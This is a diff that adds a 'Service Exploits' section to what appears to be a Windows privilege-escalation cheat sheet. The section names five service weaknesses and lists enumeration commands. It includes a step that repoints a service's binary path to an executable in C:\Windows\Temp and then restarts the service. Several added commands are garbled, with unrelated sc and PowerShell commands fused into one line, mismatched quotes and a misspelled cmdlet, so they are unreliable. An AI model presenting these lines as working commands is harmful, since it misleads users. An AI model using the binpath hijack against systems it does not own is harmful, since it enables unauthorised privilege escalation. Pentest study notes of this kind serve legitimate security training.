@@ -1268,7 +1268,66 @@ C:\> driverquery.exe /fo table
 
 **Service Exploits:**
 
+Five services that should be checked out:
 
+1. Insecure Service Permission
+2. Unquoted Service Path
+3. Insecure Registry Permission
+4. Insecure Service Executable
+5. DLL Hijacking
+
+**Service Enumeration:**
+
+On CMD:
+
+```
+C:\> tasklist /SVC
+```
+
+On PowerShell:
+
+```
+PS C:\> Get-Service
+```
+
+On WMIC:
+
+```
+wmic service list brief
+```
+
+List all running services:
+
+```
+C:\> sc queryex type=service powershell.exe -c "Get-Service | Where-Object {$_.Status -eq "Running"}
+
+or
+
+C:\> sc queryex type=service state=all | find /i "SERVICE_NAME: service_name" powershell.exe -c "Get-Service | Where Object {$_.Name -like "*service_name*"}"
+```
+
+Find status of target service:
+
+```
+C:\> sc query <SERVICE_NAME>
+
+or
+
+PS C:\> Get-Service <SERVICE_NAME>
+```
+
+Modify service binary path:
+
+```
+C:\> sc config <SERVICE_NAME> binpath='C:\Windows\Temp\<FILE>.exe'
+```
+
+Start or Stop a service:
+
+```
+C:\> net start <SERVICE_NAME>
+C:\> net stop <SERVICE_NAME>
+```
 
 -------------------------------------------------------------
 
